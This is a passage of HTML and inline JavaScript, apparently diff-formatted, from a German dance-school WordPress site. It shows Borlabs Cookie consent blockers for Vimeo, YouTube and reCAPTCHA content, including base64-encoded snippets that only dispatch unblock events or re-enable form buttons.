+ <div class="brlbs-cmpnt-container brlbs-cmpnt-content-blocker brlbs-cmpnt-with-individual-styles" data-borlabs-cookie-content-blocker-id="vimeo-content-blocker" data-borlabs-cookie-content=""><div class="brlbs-cmpnt-cb-preset-c brlbs-cmpnt-cb-vimeo"> <div class="brlbs-cmpnt-cb-thumbnail" style="background-image: url('https://motsimabuse-dietanzschule.de/wp-content/uploads/borlabs-cookie/1/brlbs-cb-vimeo-main.png')"></div> <div class="brlbs-cmpnt-cb-main"> <div class="brlbs-cmpnt-cb-play-button"></div> <div class="brlbs-cmpnt-cb-content"> <p class="brlbs-cmpnt-cb-description">Sie sehen gerade einen Platzhalterinhalt von <strong>Vimeo</strong>. Um auf den eigentlichen Inhalt zuzugreifen, klicken Sie auf die Schaltfläche unten. Bitte beachten Sie, dass dabei Daten an Drittanbieter weitergegeben werden.</p> <a class="brlbs-cmpnt-cb-provider-toggle" href="#" data-borlabs-cookie-show-provider-information role="button">Mehr Informationen</a> </div> <div class="brlbs-cmpnt-cb-buttons"> <a class="brlbs-cmpnt-cb-btn" href="#" data-borlabs-cookie-unblock role="button">Inhalt entsperren</a> <a class="brlbs-cmpnt-cb-btn" href="#" data-borlabs-cookie-accept-service role="button" style="display: inherit">Erforderlichen Service akzeptieren und Inhalte entsperren</a> </div> </div> </div></div>
+</template>
+<script>
+(function () {
+    const allBackgroundContainerVimeo = document.querySelectorAll('[data-brlbs-elementor-bg-video-vimeo="true"]:not(:has(.brlbs-cmpnt-content-blocker))');
+
+    const getVimeoId = url => (url.match(/vimeo\.com\/(?:.*\/)?([0-9]+)/) || [])[1] || null;
+    const getThumbnailBackgroundImageUrl = (videoContainer) => {
+        const bgImageCss = window.getComputedStyle(videoContainer).backgroundImage;
+        if (bgImageCss != null && bgImageCss.startsWith('url(')) {
+            return bgImageCss;
+        }
+        if (true !== true) {
+            return null;
+        }
+        const settings = JSON.parse(videoContainer.dataset.settings)
+        if (settings == null || !settings.hasOwnProperty('background_video_link')) {
+            return null;
+        }
+        const vimeoId = getVimeoId(settings.background_video_link);
+        if (vimeoId == null) {
+            return null;
+        }
+        return 'url("https://motsimabuse-dietanzschule.de/wp-content/uploads/borlabs-cookie/1/vimeo_' + vimeoId + '.jpg")';
+    };
+
+    const template = document.getElementById('brlbs-cmpnt-cb-template-vimeo-content-blocker');
+    for (let videoContainer of allBackgroundContainerVimeo) {
+        const id = videoContainer.dataset.id
+        if (videoContainer && template) {
+            const videoEmbed = videoContainer.querySelector('.elementor-background-video-embed');
+            const cb = template.content.cloneNode(true).querySelector('.brlbs-cmpnt-container');
+            cb.dataset.borlabsCookieContent = 'PHNjcmlwdD4KKGZ1bmN0aW9uKCkgewogICAgaWYgKHR5cGVvZiB3aW5kb3cuYnJsYnNFbGVtZW50b3JCZ1ZpZGVvVmltZW9VbmJsb2NrZWQgPT09ICd1bmRlZmluZWQnKSB7CiAgICAgICAgd2luZG93LmJybGJzRWxlbWVudG9yQmdWaWRlb1ZpbWVvVW5ibG9ja2VkID0gdHJ1ZTsKICAgICAgICBCb3JsYWJzQ29va2llLlRvb2xzLm9uRXhpc3QoJ2JybGJzRWxlbWVudG9yQmdWaWRlb1ZpbWVvVW5ibG9ja1JlYWR5JywgKCkgPT4gewogICAgICAgICAgICBkb2N1bWVudC5kaXNwYXRjaEV2ZW50KG5ldyBFdmVudCgnYnJsYnNfZWxlbWVudG9yX2JnVmlkZW9fdmltZW9fdW5ibG9ja2VkJykpOwogICAgICAgIH0pOwogICAgfQp9KSgpCjwvc2NyaXB0Pg==';
+            if (videoEmbed.nextSibling) {
+                videoEmbed.parentNode.insertBefore(cb, videoEmbed.nextSibling);
+            } else {
+                videoEmbed.parentNode.appendChild(cb);
+            }
+
+            const bgImageCss = getThumbnailBackgroundImageUrl(videoContainer);
+            const thumb = cb.querySelector('.brlbs-cmpnt-cb-thumbnail')
+            if (bgImageCss != null && thumb != null) {
+                thumb.style.backgroundImage = bgImageCss;
+            }
+        }
+    }
+})();
+</script><template id="brlbs-cmpnt-cb-template-youtube-content-blocker">
+ <div class="brlbs-cmpnt-container brlbs-cmpnt-content-blocker brlbs-cmpnt-with-individual-styles" data-borlabs-cookie-content-blocker-id="youtube-content-blocker" data-borlabs-cookie-content=""><div class="brlbs-cmpnt-cb-preset-c brlbs-cmpnt-cb-youtube"> <div class="brlbs-cmpnt-cb-thumbnail" style="background-image: url('https://motsimabuse-dietanzschule.de/wp-content/uploads/borlabs-cookie/1/brlbs-cb-youtube-main.png')"></div> <div class="brlbs-cmpnt-cb-main"> <div class="brlbs-cmpnt-cb-play-button"></div> <div class="brlbs-cmpnt-cb-content"> <p class="brlbs-cmpnt-cb-description">Sie sehen gerade einen Platzhalterinhalt von <strong>YouTube</strong>. Um auf den eigentlichen Inhalt zuzugreifen, klicken Sie auf die Schaltfläche unten. Bitte beachten Sie, dass dabei Daten an Drittanbieter weitergegeben werden.</p> <a class="brlbs-cmpnt-cb-provider-toggle" href="#" data-borlabs-cookie-show-provider-information role="button">Mehr Informationen</a> </div> <div class="brlbs-cmpnt-cb-buttons"> <a class="brlbs-cmpnt-cb-btn" href="#" data-borlabs-cookie-unblock role="button">Inhalt entsperren</a> <a class="brlbs-cmpnt-cb-btn" href="#" data-borlabs-cookie-accept-service role="button" style="display: inherit">Erforderlichen Service akzeptieren und Inhalte entsperren</a> </div> </div> </div></div>
+</template>
+<script>
+(function () {
+    const allBackgroundContainerYt = document.querySelectorAll('[data-brlbs-elementor-bg-video-yt="true"]:not(:has(.brlbs-cmpnt-content-blocker))');
+
+    const getYouTubeId = url => (url.match(new RegExp("(?:youtube\.com\/(?:[^\/\n\s]+\/\S+\/|(?:v|e(?:mbed)?)\/|.*[?&]v=)|youtu\.be\/)([a-zA-Z0-9_-]{11})")) || [])[1] || null;
+    const getThumbnailBackgroundImageUrl = (videoContainer) => {
+        const bgImageCss = window.getComputedStyle(videoContainer).backgroundImage;
+        if (bgImageCss != null && bgImageCss.startsWith('url(')) {
+            return bgImageCss;
+        }
+        const thumbnailQuality = 'hqdefault';
+        if (thumbnailQuality === 'none' || videoContainer.dataset.settings == null) {
+            return null;
+        }
+        const settings = JSON.parse(videoContainer.dataset.settings)
+        if (settings == null || !settings.hasOwnProperty('background_video_link')) {
+            return null;
+        }
+        const ytId = getYouTubeId(settings.background_video_link);
+        if (ytId == null) {
+            return null;
+        }
+        return 'url("https://motsimabuse-dietanzschule.de/wp-content/uploads/borlabs-cookie/1/yt_' + ytId + '_' + thumbnailQuality + '.jpg")';
+    };
+
+    const template = document.getElementById('brlbs-cmpnt-cb-template-youtube-content-blocker');
+    for (let videoContainer of allBackgroundContainerYt) {
+        const id = videoContainer.dataset.id
+        if (videoContainer && template) {
+            const videoEmbed = videoContainer.querySelector('.elementor-background-video-embed');
+            const cb = template.content.cloneNode(true).querySelector('.brlbs-cmpnt-container');
+            cb.dataset.borlabsCookieContent = 'PHNjcmlwdD4KKGZ1bmN0aW9uKCkgewogICAgaWYgKHR5cGVvZiB3aW5kb3cuYnJsYnNFbGVtZW50b3JCZ1ZpZGVvWXRVbmJsb2NrZWQgPT09ICd1bmRlZmluZWQnKSB7CiAgICAgICAgd2luZG93LmJybGJzRWxlbWVudG9yQmdWaWRlb1l0VW5ibG9ja2VkID0gdHJ1ZTsKICAgICAgICBCb3JsYWJzQ29va2llLlRvb2xzLm9uRXhpc3QoJ2JybGJzRWxlbWVudG9yQmdWaWRlb1l0VW5ibG9ja1JlYWR5JywgKCkgPT4gewogICAgICAgICAgICBkb2N1bWVudC5kaXNwYXRjaEV2ZW50KG5ldyBFdmVudCgnYnJsYnNfZWxlbWVudG9yX2JnVmlkZW9feXRfdW5ibG9ja2VkJykpOwogICAgICAgIH0pOwogICAgfQp9KSgpCjwvc2NyaXB0Pg==';
+            if (videoEmbed.nextSibling) {
+                videoEmbed.parentNode.insertBefore(cb, videoEmbed.nextSibling);
+            } else {
+                videoEmbed.parentNode.appendChild(cb);
+            }
+
+            const bgImageCss = getThumbnailBackgroundImageUrl(videoContainer);
+            const thumb = cb.querySelector('.brlbs-cmpnt-cb-thumbnail')
+            if (bgImageCss != null && thumb != null) {
+                thumb.style.backgroundImage = bgImageCss;
+            }
+        }
+    }
+})();
+</script><template id="brlbs-cmpnt-cb-template-elementor-recaptcha">
+ <div class="brlbs-cmpnt-container brlbs-cmpnt-content-blocker brlbs-cmpnt-with-individual-styles" data-borlabs-cookie-content-blocker-id="elementor-recaptcha" data-borlabs-cookie-content="PHNjcmlwdD4KKGZ1bmN0aW9uKCkgewogICAgY29uc3QgZWxlbWVudG9yRm9ybSA9IGRvY3VtZW50LmN1cnJlbnRTY3JpcHQuY2xvc2VzdCgnZm9ybS5lbGVtZW50b3ItZm9ybScpOwogICAgaWYgKGVsZW1lbnRvckZvcm0gPT0gbnVsbCkgewogICAgICAgIHJldHVybjsKICAgIH0KICAgIGVsZW1lbnRvckZvcm0ucXVlcnlTZWxlY3RvckFsbCgnLmVsZW1lbnRvci1maWVsZC10eXBlLXN1Ym1pdCBidXR0b24nKS5mb3JFYWNoKGJ0biA9PiBidG4uZGlzYWJsZWQgPSBmYWxzZSk7Cn0pKCk7Cjwvc2NyaXB0Pg=="><div class="brlbs-cmpnt-cb-preset-b brlbs-cmpnt-cb-elementor-recaptcha"> <div class="brlbs-cmpnt-cb-thumbnail" style="background-image: url('https://motsimabuse-dietanzschule.de/wp-content/uploads/borlabs-cookie/1/bct-google-recaptcha-main.png')"></div> <div class="brlbs-cmpnt-cb-main"> <div class="brlbs-cmpnt-cb-content"> <p class="brlbs-cmpnt-cb-description">Sie müssen den Inhalt von <strong>reCAPTCHA</strong> laden, um das Formular abzuschicken. Bitte beachten Sie, dass dabei Daten mit Drittanbietern ausgetauscht werden.</p> <a class="brlbs-cmpnt-cb-provider-toggle" href="#" data-borlabs-cookie-show-provider-information role="button">Mehr Informationen</a> </div> <div class="brlbs-cmpnt-cb-buttons"> <a class="brlbs-cmpnt-cb-btn" href="#" data-borlabs-cookie-unblock role="button">Inhalt entsperren</a> <a class="brlbs-cmpnt-cb-btn" href="#" data-borlabs-cookie-accept-service role="button" style="display: inherit">Erforderlichen Service akzeptieren und Inhalte entsperren</a> </div> </div> </div></div>
+</template>
+<script>
+(function() {
+    const template = document.querySelector("#brlbs-cmpnt-cb-template-elementor-recaptcha");
+    const divsToInsertBlocker = document.querySelectorAll('.elementor-field-type-recaptcha_v3 .elementor-field,.elementor-field-type-recaptcha .elementor-field');
+    for (const div of divsToInsertBlocker) {
+        const cb = template.content.cloneNode(true).querySelector('.brlbs-cmpnt-container');
+        div.appendChild(cb);
+
+        const elementorForm = div.closest('form.elementor-form');
+        if (elementorForm != null) {
+            elementorForm.querySelectorAll('.elementor-field-type-submit button').forEach(btn => btn.disabled = true);
+        }
+    }
+})()
+</script>
+</body>
+</html><!-- WP Fastest Cache file was created in 1.759 seconds, on 6. December 2025 @ 11:27 --><!-- via php -->
